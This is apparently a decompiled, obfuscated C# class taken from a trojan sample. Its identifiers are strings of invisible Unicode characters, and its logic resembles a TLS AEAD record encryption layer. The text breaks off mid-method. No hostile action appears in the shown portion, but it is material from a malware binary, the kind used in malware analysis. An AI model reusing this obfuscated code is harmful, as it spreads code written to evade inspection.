// Decompiled with JetBrains decompiler
// Type: ‭‫‏‫⁯⁭‫‪‬‎⁯⁯⁬⁫⁯‏⁬‍‫‌⁯‬‮​‍‪‏‏‬‬⁪​⁯‍⁫‎⁫‬⁫⁫‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;
using System.IO;

public class \u202D‫‏‫⁯⁭‫‪‬‎⁯⁯⁬⁫⁯‏⁬‍‫‌⁯‬‮​‍‪‏‏‬‬⁪​⁯‍⁫‎⁫‬⁫⁫‮ : 
  \u200E⁪‏⁭‫‎⁫‬⁪‍⁪‬⁬⁮⁭⁯⁫‌‎‎‍‎⁯⁯‫⁯‬⁯⁯⁪‪⁭‮​‍‌‫‏​⁯‮
{
  public const int \u206A‌⁪‮⁭‌⁮‫⁯⁪⁬⁮‌‭‏​‮‫⁪⁪⁫‏‪‏‮‮​⁪‬⁬‍‍⁮‎⁯⁮​‫‪‎‮ = 1;
  public const int \u200D‏‍⁭‍‎⁪​‍⁭‌​⁬⁪‪⁯‮⁫‪‍‭‎⁮‎⁭‏⁮‍‬⁪‪‍‏‬⁭‌⁬‌‬⁯‮ = 2;
  public const int \u202D⁯‬⁮⁯‮‮⁭⁭‭⁭⁮‍⁯⁮‪‪‭⁯‎‬‎‪‮‌‍​‍⁫​‏‌⁭​‮⁬‬⁬⁫⁮‮ = 3;
  private const int \u200E‎‬‮‏⁯‭‫‬​⁪‫⁪‌⁯‏‬‌​⁬‬⁭⁬‎‮‍⁯‌‪⁭‪⁮⁪⁭⁪⁭⁬⁮⁮⁫‮ = 1;
  private const int \u206E‫⁭​‫⁭‏⁬⁬⁮‍⁫‭‍‏⁬​‏‍⁫⁪‪⁯​⁮⁪‫​⁪⁮‮‭⁫⁯‎​⁭‭‮‌‮ = 2;
  protected readonly \u202E‬⁯‍‮⁬‏⁭⁯‮‍‏‬⁬‌⁮⁬⁮‏‌⁪‮​‎‮‮‬‫‭‪⁯‏‮‎‪‍⁪‏⁯‮‮ \u206E‮‎‭‭‭‏‮‪‬⁮⁯‪‌‬‎​‮‬⁭‮⁭‍‍⁯‬‪‍‫⁭⁫‭⁯‌‏⁬​‎‍‫‮;
  protected readonly int \u200C‌‬⁮⁪‍‭⁪⁮‎‭‪‍⁭‫‭⁬‬‍‫‮‮‌⁫‏‍⁪‬‪⁬⁭‫​⁬‫‎‍⁮‭⁭‮;
  protected readonly int \u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮;
  protected readonly int \u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮;
  protected readonly int \u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮;
  protected readonly \u200E‪⁪⁪‍​⁬⁮‮⁪‫‬⁯⁮‫‍‫‪⁭‌⁭‬‎⁬⁭‏‪⁬⁫‮⁭​⁭‬⁬‫⁪‌‍⁯‮ \u202A‏‮‎⁯‏‫‮‫‍‌‭⁯⁫‮‍⁪‍⁫⁯⁬‌‏‪⁪‬⁭‬‭‮‮⁬‭​‭⁭⁭⁯⁪⁪‮;
  protected readonly \u200E‪⁪⁪‍​⁬⁮‮⁪‫‬⁯⁮‫‍‫‪⁭‌⁭‬‎⁬⁭‏‪⁬⁫‮⁭​⁭‬⁬‫⁪‌‍⁯‮ \u200C‌⁮⁯⁫⁪‭⁭‮‮‌‌⁮‪⁭‮​⁭‌‭‌⁯‌‫‏‪‏⁯​⁮‮‌⁫‫‫⁮⁯‎⁮⁫‮;
  protected readonly byte[] \u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮;
  protected readonly byte[] \u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮;
  protected readonly bool \u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮;
  protected readonly int \u206A‬‬​‭‏‪‪‬‭‭​⁬⁭⁪‎‍‫⁭⁮‎⁯⁫‪⁪⁬‭⁪⁭‪⁯⁭⁮‌‮‎‪‎‫‏‮;

  public \u202D‫‏‫⁯⁭‫‪‬‎⁯⁯⁬⁫⁯‏⁬‍‫‌⁯‬‮​‍‪‏‏‬‬⁪​⁯‍⁫‎⁫‬⁫⁫‮(
    \u202E‬⁯‍‮⁬‏⁭⁯‮‍‏‬⁬‌⁮⁬⁮‏‌⁪‮​‎‮‮‬‫‭‪⁯‏‮‎‪‍⁪‏⁯‮‮ _param1,
    \u200E‪⁪⁪‍​⁬⁮‮⁪‫‬⁯⁮‫‍‫‪⁭‌⁭‬‎⁬⁭‏‪⁬⁫‮⁭​⁭‬⁬‫⁪‌‍⁯‮ _param2,
    \u200E‪⁪⁪‍​⁬⁮‮⁪‫‬⁯⁮‫‍‫‪⁭‌⁭‬‎⁬⁭‏‪⁬⁫‮⁭​⁭‬⁬‫⁪‌‍⁯‮ _param3,
    int _param4,
    int _param5,
    int _param6)
  {
    \u202E⁭‫‬‮⁪‮‍‌‎‎​⁪‏⁯‏⁯⁯‌‌​⁭⁫⁪‭‭‫⁯‫⁮‬​⁫⁪⁫⁮⁪⁭⁪‍‮ obj1 = _param1.\u206B‮‍⁯⁬‪⁭‬‏​‍⁯⁪‌‬​⁮‬⁪⁬‌‬​‮‫⁭⁫‎⁪‪⁭‏‬⁪‍⁬‪⁬‮⁮‮;
    \u206E‫‮⁪‍⁯‬⁫⁫⁫‭⁭‏⁭‎​‮⁬⁪‫⁬‏‫‏⁬‏‏⁭‫‭⁮⁯‍‪‮⁫⁪‎‮‪‮ obj2 = obj1.\u206D‭​⁪⁮⁪‮‎⁪⁯‎‌⁭‮‎‫⁫​‌‮⁯⁭‍⁪‫​​⁬‪‍⁮‏‍‫‭⁪‭‎⁭‪‮;
    this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮ = \u202C⁭​‍⁭⁮⁬⁯‮⁪‭‫‎⁮⁬​⁫⁮⁫⁮‭‍⁭‬‫⁬⁯⁯‪‌‭‌⁪⁬⁭⁫‍‮‍⁯‮.\u202C‮​‍‏‍⁭‭‭‎‮‌‮‏⁭⁫⁫⁮⁬⁮‏‌​‍‫⁬⁪⁪⁬‭‍⁪⁬​‪⁭‫⁫​⁫‮(obj2) ? \u202C⁭​‍⁭⁮⁬⁯‮⁪‭‫‎⁮⁬​⁫⁮⁫⁮‭‍⁭‬‫⁬⁯⁯‪‌‭‌⁪⁬⁭⁫‍‮‍⁯‮.\u200F⁬⁮‌‬‪‏‏‎‮‭‍‌⁯⁯‪⁪‌​⁭‍‌‪⁪⁭⁪⁭⁯⁮⁫‫⁭‏⁬‎⁮‪‫​‫‮(obj2) : throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    this.\u206A‬‬​‭‏‪‪‬‭‭​⁬⁭⁪‎‍‫⁭⁮‎⁯⁫‪⁪⁬‭⁪⁭‪⁯⁭⁮‌‮‎‪‎‫‏‮ = \u202D‫‏‫⁯⁭‫‪‬‎⁯⁯⁬⁫⁯‏⁬‍‫‌⁯‬‮​‍‪‏‏‬‬⁪​⁯‍⁫‎⁫‬⁫⁫‮.\u200E⁯‬‏‍​‏‍⁮⁯‮⁫⁮‌‮⁮‭⁪‏⁯⁪‪‪⁭⁭‍⁮‎​‪⁭‏⁭⁮⁬‍⁯‎​‬‮(this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮, _param6);
    switch (this.\u206A‬‬​‭‏‪‪‬‭‭​⁬⁭⁪‎‍‫⁭⁮‎⁯⁫‪⁪⁬‭⁪⁭‪⁯⁭⁮‌‮‎‪‎‫‏‮)
    {
      case 1:
        this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮ = 4;
        this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮ = 8;
        break;
      case 2:
        this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮ = 12;
        this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮ = 0;
        break;
      default:
        throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    }
    this.\u206E‮‎‭‭‭‏‮‪‬⁮⁯‪‌‬‎​‮‬⁭‮⁭‍‍⁯‬‪‍‫⁭⁫‭⁯‌‏⁬​‎‍‫‮ = _param1;
    this.\u200C‌‬⁮⁪‍‭⁪⁮‎‭‪‍⁭‫‭⁬‬‍‫‮‮‌⁫‏‍⁪‬‪⁬⁭‫​⁬‫‎‍⁮‭⁭‮ = _param4;
    this.\u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮ = _param5;
    this.\u202A‏‮‎⁯‏‫‮‫‍‌‭⁯⁫‮‍⁪‍⁫⁯⁬‌‏‪⁪‬⁭‬‭‮‮⁬‭​‭⁭⁭⁯⁪⁪‮ = _param3;
    this.\u200C‌⁮⁯⁫⁪‭⁭‮‮‌‌⁮‪⁭‮​⁭‌‭‌⁯‌‫‏‪‏⁯​⁮‮‌⁫‫‫⁮⁯‎⁮⁫‮ = _param2;
    this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮ = new byte[this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮];
    this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮ = new byte[this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮];
    bool flag = _param1.\u206A⁭⁫‫⁪‫​⁫‮⁯⁮⁫‫​⁭⁯⁬⁮​‭​‪‮‎⁮‫‌​‏‮‎‬⁫‮‪⁫‌⁮‬‬‮;
    if (this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮)
    {
      this.\u202B⁮⁮⁭‌⁫⁯‮​⁫⁯‎⁮⁭‭⁬⁮⁬‏‎‎‏‌‫‮‏‬‪‌⁭‬‍⁭‌‌‮‮‌‮⁯‮(obj1, _param3, this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮, !flag);
      this.\u202B⁮⁮⁭‌⁫⁯‮​⁫⁯‎⁮⁭‭⁬⁮⁬‏‎‎‏‌‫‮‏‬‪‌⁭‬‍⁭‌‌‮‮‌‮⁯‮(obj1, _param2, this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮, flag);
    }
    else
    {
      int num1 = 2 * _param4 + 2 * this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮;
      byte[] sourceArray = \u202C⁭​‍⁭⁮⁬⁯‮⁪‭‫‎⁮⁬​⁫⁮⁫⁮‭‍⁭‬‫⁬⁯⁯‪‌‭‌⁪⁬⁭⁫‍‮‍⁯‮.\u200B‌‪⁯‏‏​⁬⁯‭⁪‏‭‪⁭‮‏‌‮‮‬‌‭​​⁯‪‭‪⁮⁮⁫⁪‎⁫⁬‭‮‍‍‮(_param1, num1);
      int num2 = 0;
      int num3;
      if (flag)
      {
        _param3.\u200E‬‫‬‬⁮‮⁬⁯⁪‭‎⁭‪‍‪‫⁫‭‮⁯​‏‍⁮‍‫‪⁪‮⁬⁫‬⁭⁮‮‫‭‪‮‮(sourceArray, num2, _param4);
        int num4 = num2 + _param4;
        _param2.\u200E‬‫‬‬⁮‮⁬⁯⁪‭‎⁭‪‍‪‫⁫‭‮⁯​‏‍⁮‍‫‪⁪‮⁬⁫‬⁭⁮‮‫‭‪‮‮(sourceArray, num4, _param4);
        int sourceIndex1 = num4 + _param4;
        Array.Copy((Array) sourceArray, sourceIndex1, (Array) this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮, 0, this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮);
        int sourceIndex2 = sourceIndex1 + this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮;
        Array.Copy((Array) sourceArray, sourceIndex2, (Array) this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮, 0, this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮);
        num3 = sourceIndex2 + this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮;
      }
      else
      {
        _param2.\u200E‬‫‬‬⁮‮⁬⁯⁪‭‎⁭‪‍‪‫⁫‭‮⁯​‏‍⁮‍‫‪⁪‮⁬⁫‬⁭⁮‮‫‭‪‮‮(sourceArray, num2, _param4);
        int num5 = num2 + _param4;
        _param3.\u200E‬‫‬‬⁮‮⁬⁯⁪‭‎⁭‪‍‪‫⁫‭‮⁯​‏‍⁮‍‫‪⁪‮⁬⁫‬⁭⁮‮‫‭‪‮‮(sourceArray, num5, _param4);
        int sourceIndex3 = num5 + _param4;
        Array.Copy((Array) sourceArray, sourceIndex3, (Array) this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮, 0, this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮);
        int sourceIndex4 = sourceIndex3 + this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮;
        Array.Copy((Array) sourceArray, sourceIndex4, (Array) this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮, 0, this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮);
        num3 = sourceIndex4 + this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮;
      }
      if (num1 != num3)
        throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
      byte[] numArray = new byte[this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮ + this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮];
      numArray[0] = ~this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮[0];
      numArray[1] = ~this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮[1];
      _param2.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(numArray, _param5, (byte[]) null);
      _param3.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(numArray, _param5, (byte[]) null);
    }
  }

  public virtual int \u200F⁯⁫‬⁫⁬‭‭⁭‮⁮⁪‪⁪‫⁪‭‍‬‌‌‏‫⁪⁭‍⁫⁫‌‬⁮⁯‬⁯⁪​‌⁭‭⁬‮(int _param1) => _param1 + this.\u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮ + this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮ + (this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮ ? 1 : 0);

  public virtual int \u200E⁪⁭‮‭‌⁬‬‫‍‎⁫​‏‌⁯⁯‏‬‍⁭⁭‎‫‪​‬‍‎‫⁪⁭‭⁯‬‮​‬‬⁭‮(int _param1, int _param2)
  {
    int num1 = _param1;
    if (this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮)
    {
      int num2 = 0;
      num1 = 1 + Math.Min(_param2, _param1 + num2);
    }
    return num1 + this.\u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮ + this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮;
  }

  public virtual int \u206F‬⁭⁬‏⁪‏‪‏‌‬‪‬⁮‪⁭​‫‫‮⁪‪⁫‪‮‭⁯⁮‮‎‪‭⁯⁪⁫⁫‭‭‌⁪‮(int _param1) => _param1 - this.\u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮ - this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮ - (this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮ ? 1 : 0);

  public virtual \u206F⁯⁮‏‏⁯‌⁬‎‭‭⁬‏‮⁬⁪‫⁪‬‌⁪‎‭‪‌‎‎‎‍​‎‏‎‌‌‏⁭‫⁬‍‮ \u202E‫‎‮‫‌⁮‎‎‫‎‌‫‭⁬​⁯‭‌‌⁪⁯⁭‎‎‎⁬​‭⁪⁬‫⁯⁭‎‏‫‮‭‫‮(
    long _param1,
    short _param2,
    \u206E‫‮⁪‍⁯‬⁫⁫⁫‭⁭‏⁭‎​‮⁬⁪‫⁬‏‫‏⁬‏‏⁭‫‭⁮⁯‍‪‮⁫⁪‎‮‪‮ _param3,
    int _param4,
    byte[] _param5,
    int _param6,
    int _param7)
  {
    byte[] numArray1 = new byte[this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮.Length + this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮];
    switch (this.\u206A‬‬​‭‏‪‪‬‭‭​⁬⁭⁪‎‍‫⁭⁮‎⁯⁫‪⁪⁬‭⁪⁭‪⁯⁭⁮‌‮‎‪‎‫‏‮)
    {
      case 1:
        Array.Copy((Array) this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮, 0, (Array) numArray1, 0, this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮.Length);
        \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, numArray1, this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮.Length);
        break;
      case 2:
        \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, numArray1, numArray1.Length - 8);
        for (int index = 0; index < this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮.Length; ++index)
          numArray1[index] ^= this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮[index];
        break;
      default:
        throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    }
    int num1 = this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮ ? 1 : 0;
    int num2 = this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮ + this.\u200C‌⁮⁯⁫⁪‭⁭‮‮‌‌⁮‪⁭‮​⁭‌‭‌⁯‌‫‏‪‏⁯​⁮‮‌⁫‫‫⁮⁯‎⁮⁫‮.\u200E‍‮‎‎‎​‫⁫‍‮‭‫⁬⁭⁪​‮⁭‫⁫‌⁫⁯‮‪⁪‭⁭‬‎​⁪‎‪‫⁯‭‌⁫‮(_param7 + num1);
    byte[] destinationArray = new byte[_param4 + num2];
    int destinationIndex = _param4;
    if (this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮ != 0)
    {
      Array.Copy((Array) numArray1, numArray1.Length - this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮, (Array) destinationArray, destinationIndex, this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮);
      destinationIndex += this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮;
    }
    short num3 = this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮ ? (short) 23 : _param2;
    byte[] numArray2 = this.\u200C‏‎⁮⁪⁭‮⁭⁪‍‎‏‎‮‎⁮‭‌‎‬⁮​⁯‮‪⁫‎‬⁮‫⁬‌⁫‫⁪⁮‎‏‌‭‮(_param1, num3, _param3, num2, _param7);
    int num4;
    try
    {
      this.\u200C‌⁮⁯⁫⁪‭⁭‮‮‌‌⁮‪⁭‮​⁭‌‭‌⁯‌‫‏‪‏⁯​⁮‮‌⁫‫‫⁮⁯‎⁮⁫‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(numArray1, this.\u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮, numArray2);
      Array.Copy((Array) _param5, _param6, (Array) destinationArray, destinationIndex, _param7);
      if (this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮)
        destinationArray[destinationIndex + _param7] = (byte) _param2;
      num4 = destinationIndex + this.\u200C‌⁮⁯⁫⁪‭⁭‮‮‌‌⁮‪⁭‮​⁭‌‭‌⁯‌‫‏‪‏⁯​⁮‮‌⁫‫‫⁮⁯‎⁮⁫‮.\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(destinationArray, destinationIndex, _param7 + num1, destinationArray, destinationIndex);
    }
    catch (IOException ex)
    {
      throw ex;
    }
    catch (Exception ex)
    {
      throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80, ex);
    }
    if (num4 != destinationArray.Length)
